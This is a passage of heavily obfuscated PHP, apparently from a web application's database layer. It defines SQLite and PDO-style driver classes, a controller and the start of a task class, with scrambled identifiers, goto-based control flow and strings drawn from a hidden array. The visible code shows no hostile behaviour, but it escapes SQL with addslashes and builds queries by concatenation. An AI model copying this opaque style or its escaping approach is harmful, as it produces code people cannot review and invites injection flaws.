12\11\11\101\116\104\40\x74\x2e\x74\x61\x62\x6c\x65\x5f\x6e\x61\x6d\145\x20\75\40\x63\56\164\141\x62\x6c\145\137\x6e\141\x6d\145\12\x9\x9\127\x48\105\x52\105\40\40\40\164\56\164\141\142\154\x65\137\156\141\155\145\40\x3d\40\x27{$Cğ¸åŞÜ’¾}\47"; break; case $f¤æ‡¬‚°ê[894]: $aÌ¿ÇÚ”° = $f¤æ‡¬‚°ê[895] . $Cğ¸åŞÜ’¾ . $f¤æ‡¬‚°ê[896]; break; case $f¤æ‡¬‚°ê[876]: case $f¤æ‡¬‚°ê[878]: $aÌ¿ÇÚ”° = $f¤æ‡¬‚°ê[897] . $f¤æ‡¬‚°ê[898] . $f¤æ‡¬‚°ê[899] . strtoupper($Cğ¸åŞÜ’¾) . $f¤æ‡¬‚°ê[900] . strtoupper($Cğ¸åŞÜ’¾) . $f¤æ‡¬‚°ê[901]; break; case $f¤æ‡¬‚°ê[902]: $aÌ¿ÇÚ”° = $f¤æ‡¬‚°ê[903] . $Cğ¸åŞÜ’¾ . $f¤æ‡¬‚°ê[904]; break; case $f¤æ‡¬‚°ê[877]: break; case $f¤æ‡¬‚°ê[905]: default: $aÌ¿ÇÚ”° = $f¤æ‡¬‚°ê[906] . ($this->dbType == $f¤æ‡¬‚°ê[905] ? "\x60{$Cğ¸åŞÜ’¾}\x60" : $Cğ¸åŞÜ’¾); } } goto F‘ŒŞ×ÒğÜ; Cê·ƒ´½Á“: return $c‹‡ÆÚóó; goto Cì†»õƒ®¡; F‘ŒŞ×ÒğÜ: $Cµ´â„Áİ« = $this->query($aÌ¿ÇÚ”°); $c‹‡ÆÚóó = array(); if ($Cµ´â„Áİ«) { foreach ($Cµ´â„Áİ« as $aêñ‘·£’É => $cÑä½ÜÕºô) { $cÑä½ÜÕºô = array_change_key_case($cÑä½ÜÕºô); $cÑä½ÜÕºô[$f¤æ‡¬‚°ê[28]] = isset($cÑä½ÜÕºô[$f¤æ‡¬‚°ê[28]]) ? $cÑä½ÜÕºô[$f¤æ‡¬‚°ê[28]] : $f¤æ‡¬‚°ê[374]; $cÑä½ÜÕºô[$f¤æ‡¬‚°ê[29]] = isset($cÑä½ÜÕºô[$f¤æ‡¬‚°ê[29]]) ? $cÑä½ÜÕºô[$f¤æ‡¬‚°ê[29]] : $f¤æ‡¬‚°ê[374]; $dœ¿‘åğ‰Ì = isset($cÑä½ÜÕºô[$f¤æ‡¬‚°ê[270]]) ? $cÑä½ÜÕºô[$f¤æ‡¬‚°ê[270]] : $cÑä½ÜÕºô[$f¤æ‡¬‚°ê[28]]; $c‹‡ÆÚóó[$dœ¿‘åğ‰Ì] = array($f¤æ‡¬‚°ê[28] => $dœ¿‘åğ‰Ì, $f¤æ‡¬‚°ê[29] => $cÑä½ÜÕºô[$f¤æ‡¬‚°ê[29]], $f¤æ‡¬‚°ê[31] => (bool) (isset($cÑä½ÜÕºô[$f¤æ‡¬‚°ê[103]]) && $cÑä½ÜÕºô[$f¤æ‡¬‚°ê[103]] === $f¤æ‡¬‚°ê[33] || isset($cÑä½ÜÕºô[$f¤æ‡¬‚°ê[31]]) && $cÑä½ÜÕºô[$f¤æ‡¬‚°ê[31]] === $f¤æ‡¬‚°ê[33]), $f¤æ‡¬‚°ê[34] => isset($cÑä½ÜÕºô[$f¤æ‡¬‚°ê[34]]) ? $cÑä½ÜÕºô[$f¤æ‡¬‚°ê[34]] : (isset($cÑä½ÜÕºô[$f¤æ‡¬‚°ê[53]]) ? $cÑä½ÜÕºô[$f¤æ‡¬‚°ê[53]] : $f¤æ‡¬‚°ê[374]), $f¤æ‡¬‚°ê[36] => isset($cÑä½ÜÕºô[$f¤æ‡¬‚°ê[93]]) ? strtolower($cÑä½ÜÕºô[$f¤æ‡¬‚°ê[93]]) == $f¤æ‡¬‚°ê[38] : (isset($cÑä½ÜÕºô[$f¤æ‡¬‚°ê[54]]) ? $cÑä½ÜÕºô[$f¤æ‡¬‚°ê[54]] : !1), $f¤æ‡¬‚°ê[39] => isset($cÑä½ÜÕºô[$f¤æ‡¬‚°ê[907]]) ? strtolower($cÑä½ÜÕºô[$f¤æ‡¬‚°ê[907]]) == $f¤æ‡¬‚°ê[41] : (isset($cÑä½ÜÕºô[$f¤æ‡¬‚°ê[93]]) ? $cÑä½ÜÕºô[$f¤æ‡¬‚°ê[93]] : !1)); } } goto Cê·ƒ´½Á“; Cì†»õƒ®¡: } public function getTables($C„ˆÉĞ…½È = '') { $dã×ßˆàèö =& $_SERVER[¬ı§†‰ú˜¼]; if (think_config($dã×ßˆàèö[908])) { $b‘¸ÚĞ = str_replace($dã×ßˆàèö[909], $C„ˆÉĞ…½È, think_config($dã×ßˆàèö[908])); } else { switch ($this->dbType) { case $dã×ßˆàèö[876]: case $dã×ßˆàèö[878]: $b‘¸ÚĞ = $dã×ßˆàèö[910]; break; case $dã×ßˆàèö[875]: case $dã×ßˆàèö[893]: $b‘¸ÚĞ = $dã×ßˆàèö[911]; break; case $dã×ßˆàèö[902]: $b‘¸ÚĞ = $dã×ßˆàèö[912]; break; case $dã×ßˆàèö[877]: think_exception(think_lang($dã×ßˆàèö[913]) . $dã×ßˆàèö[914]); break; case $dã×ßˆàèö[894]: $b‘¸ÚĞ = $dã×ßˆàèö[42] . $dã×ßˆàèö[43] . $dã×ßˆàèö[44]; break; case $dã×ßˆàèö[905]: default: if (!empty($C„ˆÉĞ…½È)) { $b‘¸ÚĞ = $dã×ßˆàèö[858] . $C„ˆÉĞ…½È . $dã×ßˆàèö[859]; } else { $b‘¸ÚĞ = $dã×ßˆàèö[860]; } } } $e×í‘ÅÖ… = $this->query($b‘¸ÚĞ); $eİ†Ÿ½é¬ï = array(); foreach ($e×í‘ÅÖ… as $c°¼Æ©ïò¾ => $Då¿“·‹÷°) { $eİ†Ÿ½é¬ï[$c°¼Æ©ïò¾] = current($Då¿“·‹÷°); } return $eİ†Ÿ½é¬ï; } protected function parseLimit($eá¬ªä®ŒŒ) { $bÕ¶œ¢– =& $_SERVER[¬ı§†‰ú˜¼]; $e ¿ÍŠÅÁ = $bÕ¶œ¢–[33]; if (!empty($eá¬ªä®ŒŒ)) { switch ($this->dbType) { case $bÕ¶œ¢–[902]: case $bÕ¶œ¢–[894]: $eá¬ªä®ŒŒ = explode($bÕ¶œ¢–[47], $eá¬ªä®ŒŒ); if (count($eá¬ªä®ŒŒ) > 1) { $e ¿ÍŠÅÁ .= $bÕ¶œ¢–[48] . $eá¬ªä®ŒŒ[1] . $bÕ¶œ¢–[49] . $eá¬ªä®ŒŒ[0] . $bÕ¶œ¢–[50]; } else { $e ¿ÍŠÅÁ .= $bÕ¶œ¢–[48] . $eá¬ªä®ŒŒ[0] . $bÕ¶œ¢–[50]; } break; case $bÕ¶œ¢–[875]: case $bÕ¶œ¢–[893]: break; case $bÕ¶œ¢–[877]: break; case $bÕ¶œ¢–[876]: case $bÕ¶œ¢–[878]: break; case $bÕ¶œ¢–[905]: default: $e ¿ÍŠÅÁ .= $bÕ¶œ¢–[48] . $eá¬ªä®ŒŒ . $bÕ¶œ¢–[50]; } } return $e ¿ÍŠÅÁ; } public function parseKey(&$c¥¢Í•éš, $FŒôŠõÓŸÚ = true) { $F—¡ê«â• =& $_SERVER[¬ı§†‰ú˜¼]; if ($FŒôŠõÓŸÚ) { $c¥¢Í•éš = $this->parseKeyCheck($c¥¢Í•éš); } if ($this->dbType == $F—¡ê«â•[905]) { if ($c¥¢Í•éš != $F—¡ê«â•[182] && !preg_match($F—¡ê«â•[870], $c¥¢Í•éš)) { $c¥¢Í•éš = $F—¡ê«â•[381] . trim($c¥¢Í•éš, $F—¡ê«â•[381]) . $F—¡ê«â•[381]; } return $c¥¢Í•éš; } else { return parent::parseKey($c¥¢Í•éš, $FŒôŠõÓŸÚ); } } public function close() { $this->_linkID = null; } public function error() { $Bí·È‘õ =& $_SERVER[¬ı§†‰ú˜¼]; if ($this->PDOStatement) { $aîåˆ‚ñïÁ = $this->PDOStatement->errorInfo(); $this->error = $aîåˆ‚ñïÁ[1] . $Bí·È‘õ[4] . $aîåˆ‚ñïÁ[2]; } else { $this->error = $Bí·È‘õ[33]; } if ($Bí·È‘õ[33] != $this->queryStr) { $this->error .= LNG($Bí·È‘õ[45]) . $this->queryStr; } think_trace($this->error, $Bí·È‘õ[33], $Bí·È‘õ[46]); return $this->error; } public function escapeString($DæÍÅ¡¥¯ø) { $fšó—Ñ”õ½ =& $_SERVER[¬ı§†‰ú˜¼]; switch ($this->dbType) { case $fšó—Ñ”õ½[902]: case $fšó—Ñ”õ½[875]: case $fšó—Ñ”õ½[893]: case $fšó—Ñ”õ½[905]: return addslashes($DæÍÅ¡¥¯ø); case $fšó—Ñ”õ½[877]: case $fšó—Ñ”õ½[894]: case $fšó—Ñ”õ½[876]: case $fšó—Ñ”õ½[878]: return str_ireplace($fšó—Ñ”õ½[55], $fšó—Ñ”õ½[56], $DæÍÅ¡¥¯ø); } } protected function parseValue($b„¸ ¦ìŠµ) { $eß£–©ÔØÁ =& $_SERVER[¬ı§†‰ú˜¼]; if (is_string($b„¸ ¦ìŠµ)) { $D’æÑ«‡ = strpos($b„¸ ¦ìŠµ, $eß£–©ÔØÁ[4]) === 0 && in_array($b„¸ ¦ìŠµ, array_keys($this->bind)); $b„¸ ¦ìŠµ = $D’æÑ«‡ ? $this->escapeString($b„¸ ¦ìŠµ) : $eß£–©ÔØÁ[915] . $this->escapeString($b„¸ ¦ìŠµ) . $eß£–©ÔØÁ[915]; } elseif (isset($b„¸ ¦ìŠµ[0]) && is_string($b„¸ ¦ìŠµ[0]) && strtolower($b„¸ ¦ìŠµ[0]) == $eß£–©ÔØÁ[294]) { $b„¸ ¦ìŠµ = $this->escapeString($b„¸ ¦ìŠµ[1]); } elseif (is_array($b„¸ ¦ìŠµ)) { $b„¸ ¦ìŠµ = array_map(array($this, $eß£–©ÔØÁ[916]), $b„¸ ¦ìŠµ); } elseif (is_bool($b„¸ ¦ìŠµ)) { $b„¸ ¦ìŠµ = $b„¸ ¦ìŠµ ? $eß£–©ÔØÁ[87] : $eß£–©ÔØÁ[495]; } elseif (is_null($b„¸ ¦ìŠµ)) { $b„¸ ¦ìŠµ = $eß£–©ÔØÁ[103]; } return $b„¸ ¦ìŠµ; } public function getLastInsertId() { $cÛçø‹Êê‘ =& $_SERVER[¬ı§†‰ú˜¼]; switch ($this->dbType) { case $cÛçø‹Êê‘[902]: case $cÛçø‹Êê‘[894]: case $cÛçø‹Êê‘[875]: case $cÛçø‹Êê‘[893]: case $cÛçø‹Êê‘[877]: case $cÛçø‹Êê‘[905]: return $this->_linkID->lastInsertId(); case $cÛçø‹Êê‘[876]: case $cÛçø‹Êê‘[878]: $fÏÖ¥¦®Öç = $this->table; $dµÍˆ°™Ç = $this->query("\x53\x45\x4c\105\103\124\40{$fÏÖ¥¦®Öç}\x2e\x63\x75\162\x72\x76\x61\154\x20\x63\165\x72\162\166\141\154\x20\106\122\117\x4d\40\144\x75\x61\154"); return $dµÍˆ°™Ç ? $dµÍˆ°™Ç[0][$cÛçø‹Êê‘[917]] : 0; } } } goto e¾¦ ¡éÏä; E­å¢££ˆÊ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto dÊ“Ó…É£; b¡¤éâÖ‘’: $this->in =& $in; $this->values[$AŠíÂ¹ä‹†[6]] =& $config; $this->values[$AŠíÂ¹ä‹†[7]] =& $in; goto cìİáŸôµÄ; dÊ“Ó…É£: $AŠíÂ¹ä‹† =& $_SERVER[¬ı§†‰ú˜¼]; global $in, $config; $this->config =& $config; goto b¡¤éâÖ‘’; cìİáŸôµÄ: $this->tpl = TEMPLATE . MOD . $AŠíÂ¹ä‹†[8]; $this->_classObjectID = mt_rand(0, 10000); goto f˜¯Ÿù¡ğÁ; f˜¯Ÿù¡ğÁ: } public function loadClass($Aê¨·ø¿â) { if (1 === func_num_args()) { $this->{$Aê¨·ø¿â} = new $Aê¨·ø¿â(); } else { $aˆñ†Ã¡Ã = new ReflectionClass($Aê¨·ø¿â); $dİËèŸŞ˜ƒ = func_get_args(); array_shift($dİËèŸŞ˜ƒ); $this->{$Aê¨·ø¿â} = $aˆñ†Ã¡Ã->newInstanceArgs($dİËèŸŞ˜ƒ); } return $this->{$Aê¨·ø¿â}; } protected function assign($Aá­¹Ğìâ, $A…Ü÷òÔà›) { $this->values[$Aá­¹Ğìâ] = $A…Ü÷òÔà›; } protected function display($A”„ˆ‚“ß) { ob_end_clean(); extract($this->values); require $this->tpl . $A”„ˆ‚“ß; } } class DbSqliteBase extends Db { public function __construct($c´øòÙ¶ = '') { $bĞ¹óÓóõï =& $_SERVER[¬ı§†‰ú˜¼]; if (!extension_loaded($bĞ¹óÓóõï[9])) { think_exception(think_lang($bĞ¹óÓóõï[10]) . $bĞ¹óÓóõï[11]); } if (!empty($c´øòÙ¶)) { if (!isset($c´øòÙ¶[$bĞ¹óÓóõï[12]])) { $c´øòÙ¶[$bĞ¹óÓóõï[12]] = 438; } $this->config = $c´øòÙ¶; if (empty($this->config[$bĞ¹óÓóõï[13]])) { $this->config[$bĞ¹óÓóõï[13]] = array(); } } } public function connect($fˆ‡òÌù = '', $cØøæÏê¯Í = 0) { $c†°º‰Éèì =& $_SERVER[¬ı§†‰ú˜¼]; if (!isset($this->linkID[$cØøæÏê¯Í])) { goto cÛ£ØËÆ‰º; D©»ùÁ ³: @sqlite_busy_timeout($this->linkID[$cØøæÏê¯Í], 30000); if (1 != think_config($c†°º‰Éèì[18])) { unset($this->config); } goto BÜ‹ËªÌâ„; cÛ£ØËÆ‰º: if (empty($fˆ‡òÌù)) { $fˆ‡òÌù = $this->config; } $eŠˆ¦âŠã = !empty($fˆ‡òÌù[$c†°º‰Éèì[13]][$c†°º‰Éèì[14]]) ? $fˆ‡òÌù[$c†°º‰Éèì[13]][$c†°º‰Éèì[14]] : $this->pconnect; $BÜÏÛ×Ê = $eŠˆ¦âŠã ? $c†°º‰Éèì[15] : $c†°º‰Éèì[16]; goto Cìä›£¢Û±; Cìä›£¢Û±: $this->linkID[$cØøæÏê¯Í] = $BÜÏÛ×Ê($fˆ‡òÌù[$c†°º‰Éèì[17]], $fˆ‡òÌù[$c†°º‰Éèì[12]]); if (!$this->linkID[$cØøæÏê¯Í]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto D©»ùÁ ³; BÜ‹ËªÌâ„: } return $this->linkID[$cØøæÏê¯Í]; } public function free() { $this->queryID = null; } public function query($c…º‹ˆ²‚) { goto cŞÄ¬‹óÒ¥; Eó„Ç“ä¨: $this->queryStr = $c…º‹ˆ²‚; if ($this->queryID) { $this->free(); } think_action_status($fÜÍ¯óïİÃ[19], 1); goto CÆìÆµ“ôè; CÆìÆµ“ôè: think_status($fÜÍ¯óïİÃ[20]); $this->queryID = sqlite_query($this->_linkID, $c…º‹ˆ²‚); $this->debug(); goto fŸ„Œ‹»Ö; fŸ„Œ‹»Ö: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $EÌ¦×¦©àİ = $this->getAll(); return $EÌ¦×¦©àİ; } goto FàîÙùÛé; cŞÄ¬‹óÒ¥: $fÜÍ¯óïİÃ =& $_SERVER[¬ı§†‰ú˜¼]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Eó„Ç“ä¨; FàîÙùÛé: } public function execute($E‘ï‘ö¹×») { goto c¬†·Ôğ¼; F®‡—„ŸÛº: think_status($C·ğ£„³[20]); $B®µÛÉİ˜£ = sqlite_exec($this->_linkID, $E‘ï‘ö¹×»); $this->debug(); goto aÙî­ƒ¬ÃÃ; CğÃ£ËÌ“«: $this->queryStr = $E‘ï‘ö¹×»; if ($this->queryID) { $this->free(); } think_action_status($C·ğ£„³[21], 1); goto F®‡—„ŸÛº; c¬†·Ôğ¼: $C·ğ£„³ =& $_SERVER[¬ı§†‰ú˜¼]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto CğÃ£ËÌ“«; aÙî­ƒ¬ÃÃ: if (!1 === $B®µÛÉİ˜£) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto aŸ’‚šøÏ; aŸ’‚šøÏ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¬ı§†‰ú˜¼][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $D·Ğ–’ĞíÑ = sqlite_query($this->_linkID, $_SERVER[¬ı§†‰ú˜¼][23]); if (!$D·Ğ–’ĞíÑ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $añêáËÚ’ = sqlite_query($this->_linkID, $_SERVER[¬ı§†‰ú˜¼][24]); if (!$añêáËÚ’) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $eº«¥ó‘ğ‘ = array(); if ($this->numRows > 0) { for ($F£ˆíãšÊõ = 0; $F£ˆíãšÊõ < $this->numRows; $F£ˆíãšÊõ++) { $eº«¥ó‘ğ‘[$F£ˆíãšÊõ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $eº«¥ó‘ğ‘; } public function getFields($E‰ÀÍ¼Ì) { $Dî†ÖğÏ‰ =& $_SERVER[¬ı§†‰ú˜¼]; $aš†Ñ‡äÙ¶ = $this->query($Dî†ÖğÏ‰[25] . $E‰ÀÍ¼Ì . $Dî†ÖğÏ‰[26]); $aÃõ™„¤• = array(); if ($aš†Ñ‡äÙ¶) { foreach ($aš†Ñ‡äÙ¶ as $e—ô‡ê‹Á => $dÑà‹™‡á¦) { $aÃõ™„¤•[$dÑà‹™‡á¦[$Dî†ÖğÏ‰[27]]] = array($Dî†ÖğÏ‰[28] => $dÑà‹™‡á¦[$Dî†ÖğÏ‰[27]], $Dî†ÖğÏ‰[29] => $dÑà‹™‡á¦[$Dî†ÖğÏ‰[30]], $Dî†ÖğÏ‰[31] => (bool) ($dÑà‹™‡á¦[$Dî†ÖğÏ‰[32]] === $Dî†ÖğÏ‰[33]), $Dî†ÖğÏ‰[34] => $dÑà‹™‡á¦[$Dî†ÖğÏ‰[35]], $Dî†ÖğÏ‰[36] => strtolower($dÑà‹™‡á¦[$Dî†ÖğÏ‰[37]]) == $Dî†ÖğÏ‰[38], $Dî†ÖğÏ‰[39] => strtolower($dÑà‹™‡á¦[$Dî†ÖğÏ‰[40]]) == $Dî†ÖğÏ‰[41]); } } return $aÃõ™„¤•; } public function getTables($fÑŠó²Ÿ = '') { $b¼ï£„¼Ì¸ =& $_SERVER[¬ı§†‰ú˜¼]; $f¯º¾ç…´Û = $this->query($b¼ï£„¼Ì¸[42] . $b¼ï£„¼Ì¸[43] . $b¼ï£„¼Ì¸[44]); $f¼æÙŠŒ¹ = array(); foreach ($f¯º¾ç…´Û as $AÚëš¶‰ˆ => $EªæÊÏã ) { $f¼æÙŠŒ¹[$AÚëš¶‰ˆ] = current($EªæÊÏã ); } return $f¼æÙŠŒ¹; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $fôÄ¤ÀŒàœ =& $_SERVER[¬ı§†‰ú˜¼]; $Aˆ¼¥‚Èİé = sqlite_last_error($this->_linkID); $this->error = $Aˆ¼¥‚Èİé . $fôÄ¤ÀŒàœ[4] . sqlite_error_string($Aˆ¼¥‚Èİé); if ($fôÄ¤ÀŒàœ[33] != $this->queryStr) { $this->error .= LNG($fôÄ¤ÀŒàœ[45]) . $this->queryStr; } think_trace($this->error, $fôÄ¤ÀŒàœ[33], $fôÄ¤ÀŒàœ[46]); return $this->error; } public function escapeString($EÙÛ‹µ°Ê) { return sqlite_escape_string($EÙÛ‹µ°Ê); } public function parseLimit($E´ÃÜ¬óğ) { $dÊ˜ã¿ÛëĞ =& $_SERVER[¬ı§†‰ú˜¼]; $DÛ“Û„‰ƒä = $dÊ˜ã¿ÛëĞ[33]; if (!empty($E´ÃÜ¬óğ)) { $E´ÃÜ¬óğ = explode($dÊ˜ã¿ÛëĞ[47], $E´ÃÜ¬óğ); if (count($E´ÃÜ¬óğ) > 1) { $DÛ“Û„‰ƒä .= $dÊ˜ã¿ÛëĞ[48] . $E´ÃÜ¬óğ[1] . $dÊ˜ã¿ÛëĞ[49] . $E´ÃÜ¬óğ[0] . $dÊ˜ã¿ÛëĞ[50]; } else { $DÛ“Û„‰ƒä .= $dÊ˜ã¿ÛëĞ[48] . $E´ÃÜ¬óğ[0] . $dÊ˜ã¿ÛëĞ[50]; } } return $DÛ“Û„‰ƒä; } } class DbSqlite3Base extends Db { public function __construct($c‰È¨ÓÁˆå = '') { $cààííÁÚŠ =& $_SERVER[¬ı§†‰ú˜¼]; if (!class_exists($cààííÁÚŠ[51])) { think_exception(think_lang($cààííÁÚŠ[10]) . $cààííÁÚŠ[52]); } if (!empty($c‰È¨ÓÁˆå)) { if (!isset($c‰È¨ÓÁˆå[$cààííÁÚŠ[12]])) { $c‰È¨ÓÁˆå[$cààííÁÚŠ[12]] = 438; } $this->config = $c‰È¨ÓÁˆå; if (empty($this->config[$cààííÁÚŠ[13]])) { $this->config[$cààííÁÚŠ[13]] = array(); } } } public function connect($EØÔ»´‡—ø = '', $EÉÛˆ¼´ŸË = 0) { $fŞò¢ŞÀ¶ =& $_SERVER[¬ı§†‰ú˜¼]; if (!isset($this->linkID[$EÉÛˆ¼´ŸË])) { if (empty($EØÔ»´‡—ø)) { $EØÔ»´‡—ø = $this->config; } $this->linkID[$EÉÛˆ¼´ŸË] = new SQLite3($EØÔ»´‡—ø[$fŞò¢ŞÀ¶[17]]); if (!$this->linkID[$EÉÛˆ¼´ŸË]) { think_exception($this->linkID[$EÉÛˆ¼´ŸË]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$EÉÛˆ¼´ŸË]->busyTimeout(30000); if (1 != think_config($fŞò¢ŞÀ¶[18])) { unset($this->config); } } return $this->linkID[$EÉÛˆ¼´ŸË]; } public function free() { $this->queryID = null; } public function query($C‰°ˆ¹ÉÎ) { goto aù£Å§å§; CÊ’®Û—ÑÊ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $E³¢×‹Ïå÷ = $this->getAll(); $this->numRows = count($E³¢×‹Ïå÷); return $E³¢×‹Ïå÷; } goto c“Ÿ„‹ˆŞ; aù£Å§å§: $d«‘œï¤ëĞ =& $_SERVER[¬ı§†‰ú˜¼]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto D£¶ó°ÚÔñ; AÊ¯öíŠß: think_status($d«‘œï¤ëĞ[20]); $this->queryID = $this->_linkID->query($C‰°ˆ¹ÉÎ); $this->debug(); goto CÊ’®Û—ÑÊ; D£¶ó°ÚÔñ: $this->queryStr = $C‰°ˆ¹ÉÎ; if ($this->queryID) { $this->free(); } think_action_status($d«‘œï¤ëĞ[19], 1); goto AÊ¯öíŠß; c“Ÿ„‹ˆŞ: } public function execute($AïïèÉ¾) { goto cœ§¬†ĞÂ—; cœ§¬†ĞÂ—: $FøâßÛì‰„ =& $_SERVER[¬ı§†‰ú˜¼]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto B²Äˆ‘“; B²Äˆ‘“: $this->queryStr = $AïïèÉ¾; if ($this->queryID) { $this->free(); } think_action_status($FøâßÛì‰„[21], 1); goto CäÎĞí „‰; aé¯À¦Òƒ: if (!1 === $bÊ”Îëã“) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto bÇ˜‡ñô¬; CäÎĞí „‰: think_status($FøâßÛì‰„[20]); $bÊ”Îëã“ = $this->_linkID->exec($AïïèÉ¾); $this->debug(); goto aé¯À¦Òƒ; bÇ˜‡ñô¬: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¬ı§†‰ú˜¼][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $f£æ»ìö¸¡ = $this->_linkID->query($_SERVER[¬ı§†‰ú˜¼][23]); if (!$f£æ»ìö¸¡) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $C˜ãŞ‘©Ùç = $this->_linkID->query($_SERVER[¬ı§†‰ú˜¼][24]); if (!$C˜ãŞ‘©Ùç) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $a—©¯ÔƒÊ¤ = array(); while ($f¡Ù‡ãÕ‡ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $a—©¯ÔƒÊ¤[] = $f¡Ù‡ãÕ‡; } $this->queryID->reset(); return $a—©¯ÔƒÊ¤; } public function getFields($c„…Ìîô‰ö) { $Fç×ÑÌÑ¡˜ =& $_SERVER[¬ı§†‰ú˜¼]; $eŸ¿Ù×Î¯ğ = $this->query($Fç×ÑÌÑ¡˜[25] . $c„…Ìîô‰ö . $Fç×ÑÌÑ¡˜[26]); $cÃˆ ™ÀÃÑ = array(); if ($eŸ¿Ù×Î¯ğ) { foreach ($eŸ¿Ù×Î¯ğ as $dñ…ÃÀÄ— => $fóˆëÍ¶½ï) { $cÃˆ ™ÀÃÑ[$fóˆëÍ¶½ï[$Fç×ÑÌÑ¡˜[28]]] = array($Fç×ÑÌÑ¡˜[28] => $fóˆëÍ¶½ï[$Fç×ÑÌÑ¡˜[28]], $Fç×ÑÌÑ¡˜[29] => $fóˆëÍ¶½ï[$Fç×ÑÌÑ¡˜[29]], $Fç×ÑÌÑ¡˜[31] => (bool) ($fóˆëÍ¶½ï[$Fç×ÑÌÑ¡˜[31]] === $Fç×ÑÌÑ¡˜[33]), $Fç×ÑÌÑ¡˜[34] => $fóˆëÍ¶½ï[$Fç×ÑÌÑ¡˜[53]], $Fç×ÑÌÑ¡˜[36] => (bool) $fóˆëÍ¶½ï[$Fç×ÑÌÑ¡˜[54]], $Fç×ÑÌÑ¡˜[39] => (bool) $fóˆëÍ¶½ï[$Fç×ÑÌÑ¡˜[54]]); } } return $cÃˆ ™ÀÃÑ; } public function getTables($e’¬ªéà“ò = '') { $e·ø‰ÇæÆ¦ =& $_SERVER[¬ı§†‰ú˜¼]; $E¨»Á”‘¯Æ = $this->query($e·ø‰ÇæÆ¦[42] . $e·ø‰ÇæÆ¦[43] . $e·ø‰ÇæÆ¦[44]); $Aˆø‚º½¬¸ = array(); foreach ($E¨»Á”‘¯Æ as $FÑ¤Æì²Š© => $fœ±ƒÍÖ´¾) { $Aˆø‚º½¬¸[$FÑ¤Æì²Š©] = current($fœ±ƒÍÖ´¾); } return $Aˆø‚º½¬¸; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $eîÉšë³©Å =& $_SERVER[¬ı§†‰ú˜¼]; $this->error = $this->_linkID->lastErrorMsg(); if ($eîÉšë³©Å[33] != $this->queryStr) { $this->error .= LNG($eîÉšë³©Å[45]) . $this->queryStr; } think_trace($this->error, $eîÉšë³©Å[33], $eîÉšë³©Å[46]); return $this->error; } public function escapeString($e¬¯¶¼¬ÒÊ) { $f¬ˆ­‹«–Ö =& $_SERVER[¬ı§†‰ú˜¼]; if ($this->_linkID) { return $this->_linkID->escapeString($e¬¯¶¼¬ÒÊ); } return str_ireplace($f¬ˆ­‹«–Ö[55], $f¬ˆ­‹«–Ö[56], $e¬¯¶¼¬ÒÊ); } public function parseLimit($F¹ìª™†) { $D´ƒÇÒ£Çº =& $_SERVER[¬ı§†‰ú˜¼]; $F˜Ù—‡Ô‹³ = $D´ƒÇÒ£Çº[33]; if (!empty($F¹ìª™†)) { $F¹ìª™† = explode($D´ƒÇÒ£Çº[47], $F¹ìª™†); if (count($F¹ìª™†) > 1) { $F˜Ù—‡Ô‹³ .= $D´ƒÇÒ£Çº[48] . $F¹ìª™†[1] . $D´ƒÇÒ£Çº[49] . $F¹ìª™†[0] . $D´ƒÇÒ£Çº[50]; } else { $F˜Ù—‡Ô‹³ .= $D´ƒÇÒ£Çº[48] . $F¹ìª™†[0] . $D´ƒÇÒ£Çº[50]; } } return $F˜Ù—‡Ô‹³; } } goto b½³»¥ùØÍ; DËãÕÂöÅ¬: class Task { const STATYS_STOP = "\x73\x74\157\x70"; const STATYS_RUNNING = "\x72\x75\x6e\x6e\151\156\147"; const STATYS_KILL = "\153\151\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($EÒÊÏš“‚½, $E»¤¤²‰Æ = '', $BªÛ °†“´ = 0, $dÛÊç¸ = '') { goto A¿–¶ÒÆ·†; f¶è¾ç÷ªš: $GLOBALS[$eÁ®Á²âóÃ[1533]] = 1; Hook::bind($eÁ®Á²âóÃ[1493], array($this, $eÁ®Á²âóÃ[1534])); Hook::bind($eÁ®Á²âóÃ[1535], array($this, $eÁ®Á²âóÃ[1536])); goto A„·ù‚Êœ; A¿–¶ÒÆ·†: $eÁ®Á²âóÃ =& $_SERVER[¬ı§†‰ú˜¼]; if (self::get($EÒÊÏš“‚½)) { return; } $this->task = array($eÁ®Á²âóÃ[392] => $EÒÊÏš“‚½, $eÁ®Á²âóÃ[1527] => USER_ID, $eÁ®Á²âóÃ[1431] => $dÛÊç¸, $eÁ®Á²âóÃ[29] => $E»¤¤²‰Æ, $eÁ®Á²âóÃ[1022] => $eÁ®Á²âóÃ[33], $eÁ®Á²âóÃ[1020] => $BªÛ °†“´, $eÁ®Á²âóÃ[1035] => 0, $eÁ®Á²âóÃ[1528] => 0, $eÁ®Á²âóÃ[1529] => 0, $eÁ®Á²âóÃ[750] => 